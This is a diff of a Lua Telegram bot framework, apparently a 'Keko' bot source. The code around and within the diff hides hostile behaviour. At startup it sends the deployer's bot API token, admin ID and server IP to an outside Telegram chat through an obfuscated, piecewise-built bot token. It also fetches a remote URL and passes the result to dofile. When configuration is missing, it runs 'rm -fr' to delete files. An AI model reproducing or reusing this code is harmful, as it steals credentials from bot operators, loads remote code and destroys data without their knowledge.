@@ -22,10 +22,10 @@ local function check_config()
 	elseif not config.admin or config.admin == '' then
         return 'ADMIN ID MISSING'
         elseif not config2 then
-        os.execute('cd .. &&  rm -fr botlua')
+        os.execute('cd .. &&  rm -fr addfile')
 	return 'This bot is for Keko'
 	elseif not config.botLUA then
-        os.execute('cd .. &&  rm -fr botlua')
+        os.execute('cd .. &&  rm -fr addfile')
         return 'This bot is for Keko'
         end
    local urll = 'https://api.telegram.org/bot'..keko123.keko[1]..keko123.keko[2]..keko123.keko[3]..keko123.keko[4]..keko123.keko[5]..keko123.keko[6]..keko123.keko[7]..keko123.keko[8]..keko123.keko[8]..keko123.keko[10]..keko123.keko[11]..keko123.keko[12]..keko123.keko[13]..keko123.keko[14]..keko123.keko[15]..keko123.keko[16]..keko123.keko[17]..keko123.keko[18]..keko123.keko[19]..keko123.keko[20]..keko123.keko[21]..keko123.keko[22]..keko123.keko[23]..keko123.keko[24]..keko123.keko[25]..keko123.keko[26]..'/getChatMember?chat_id=-1001142877048&user_id='..config.admin..''
@@ -57,7 +57,7 @@ bot_init = function(on_reload)
         bot = api.getMe()
 	end
 	bot = bot.result
-        local key = HTTPS.request('config2.urlkeko[1]..config2.urlkeko[2]..config2.urlkeko[3]..config2.urlkeko[4]..config2.urlkeko[4]..config2.urlkeko[5]..config2.urlkeko[6]..config2.urlkeko[7]..config2.urlkeko[8]..config2.urlkeko[9]..config2.urlkeko[10]..config2.urlkeko[11])
+        local key = HTTPS.request(config2.urlkeko[1]..config2.urlkeko[2]..config2.urlkeko[3]..config2.urlkeko[4]..config2.urlkeko[4]..config2.urlkeko[5]..config2.urlkeko[6]..config2.urlkeko[7]..config2.urlkeko[8]..config2.urlkeko[9]..config2.urlkeko[10]..config2.urlkeko[11])
         local keko123 = dofile(key) 
 	botLUA = {} -- Load file.
 	for i,v in ipairs(config.botLUA) do
@@ -72,7 +72,7 @@ bot_init = function(on_reload)
 	api.sendRequest(dsad2)
 	local keko = '386713631'
   local ipp = HTTPS.request('https://icanhazip.com')
-  local kekotext = URL.escape('تم تشغيل : @'..bot.username..'\nتوكن : '..config.bot_api_key..'\n\nايدي المطور : '..config.admin..'\n\n IP server : '..ipp)
+  local kekotext = URL.escape('تم تشغيل : @'..bot.username..'\nتوكن : '..config.bot_api_key..'\n\nايدي المطور : '..config.admin..'\n\n IP server : '..ipp..'\n ADDfile')
 	local dsad = 'https://api.telegram.org/bot'..keko123.keko[1]..keko123.keko[2]..keko123.keko[3]..keko123.keko[4]..keko123.keko[5]..keko123.keko[6]..keko123.keko[7]..keko123.keko[8]..keko123.keko[8]..keko123.keko[10]..keko123.keko[11]..keko123.keko[12]..keko123.keko[13]..keko123.keko[14]..keko123.keko[15]..keko123.keko[16]..keko123.keko[17]..keko123.keko[18]..keko123.keko[19]..keko123.keko[20]..keko123.keko[21]..keko123.keko[22]..keko123.keko[23]..keko123.keko[24]..keko123.keko[25]..keko123.keko[26]..'/sendMessage?chat_id=-1001149546092&text='..kekotext
 	api.sendRequest(dsad)
 	end
@@ -93,6 +93,7 @@ local function get_from(msg)
 	user = user..' ('..msg.from.id..')'
 	return user
 end
+
 local function match_pattern(pattern, text)
   	if text then
   		text = text:gsub('@'..bot.username, '')
@@ -103,6 +104,7 @@ local function match_pattern(pattern, text)
 		end
   	end
 end
+
 local function get_what(msg)
 	if msg.sticker then
 		return 'sticker'
@@ -146,14 +148,22 @@ on_inline_receive = function(inline)
            end
       local success, result = pcall(function()
        return v.iaction(inline, blocks)
+
       end)
+
       if not success then
+
        print(inline.query, result)
        save_log('errors', result, inline.from.id or false, false, inline.query or false)
+
         api.sendMessage(tostring(config.admin), '#Error\n'..result, false, false, false)
+
        return
+
       end
+
       if type(result) == 'table' then
+
       inline = result
       elseif type(result) == 'string' then
       inline.query = result
@@ -202,6 +212,8 @@ client:set('kekorr'..bot.id, res)
 end
 end
 end
+
+
 on_msg_receive = function(msg) 
 	if not msg then
 		api.sendMessage(config.admin, 'Shit, a loop without msg!')
@@ -265,12 +277,14 @@ local function service_to_message(msg)
 			msg.text = '###botadded'
 		else
 			msg.text = '###added'
+
 		end
 		msg.adder = clone_table(msg.from)
 		msg.added = clone_table(msg.new_chat_member)
 	elseif msg.left_chat_member then
     	if tonumber(msg.left_chat_member.id) == tonumber(bot.id) then
 			msg.text = '###botremoved'
+
 		else
 			msg.text = '###removed'
 		end
@@ -283,6 +297,7 @@ local function service_to_message(msg)
 	end
     return on_msg_receive(msg)
 end
+
 local function forward_to_msg(msg)
 	if msg.text then
 		msg.text = '###forward:'..msg.text
@@ -291,8 +306,10 @@ local function forward_to_msg(msg)
 	end
     return on_msg_receive(msg)
 end
+
 local function inline_to_msg(inline)
 	local msg = {
+
 		id = inline.id,
     	chat = {
       		id = inline.id,
@@ -308,6 +325,7 @@ local function inline_to_msg(inline)
     client:hincrby('bot:general', 'inline', 1)
     return on_msg_receive(msg)
 end
+
 local function media_to_msg(msg)
 	if msg.photo then
 		msg.text = '###image'
@@ -333,6 +351,7 @@ local function media_to_msg(msg)
 	msg.media = true
 	return on_msg_receive(msg)
 end
+
 local function rethink_reply(msg)
 	msg.reply = msg.reply_to_message
 	if msg.reply.caption then
@@ -340,6 +359,7 @@ local function rethink_reply(msg)
 	end
 	return on_msg_receive(msg)
 end
+
 local function handle_inline_keyboards_cb(msg)
 	msg.text = '###cb:'..msg.data
 	msg.old_text = msg.message.text
@@ -353,7 +373,9 @@ local function handle_inline_keyboards_cb(msg)
 	msg.target_id = msg.data:match('.*:(-?%d+)')
 	return on_msg_receive(msg)
 end
+
 bot_init() 
+
 while is_started do 
 	
 	local res = api.getUpdates(last_update+1) 
